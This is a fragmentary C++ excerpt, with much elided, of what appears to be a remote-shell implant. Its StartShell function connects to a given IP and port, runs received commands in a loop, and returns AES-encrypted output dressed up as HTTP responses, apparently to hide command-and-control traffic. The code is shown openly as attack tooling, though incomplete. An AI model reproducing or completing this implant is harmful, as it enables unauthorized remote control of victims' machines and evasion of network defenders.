...
std::string buildHttpResponse(const std::string& responseData) {
    // 必要头部计算
...
BOOL StartShell(const char* pcszIP, const char* usPort1) {
    ...
    while (true) {
        ...
        std::string subStr = "\r\n\r\n";
        size_t pos = cmd.find(subStr);
        if (pos != std::string::npos) {
            cmd = cmd.substr(pos + subStr.length());
        }
        else
        {
            break;
        ...
        if (cmd.substr(0,4) == "exit") {
            ...
            exitMsg = buildHttpResponse(Encrypt::encodeByAES(exitMsg, key));
            if ((send(hSock, exitMsg.c_str(), exitMsg.size(), 0)) == SOCKET_ERROR) {
        ...
        result = buildHttpResponse(Encrypt::encodeByAES(result,key));
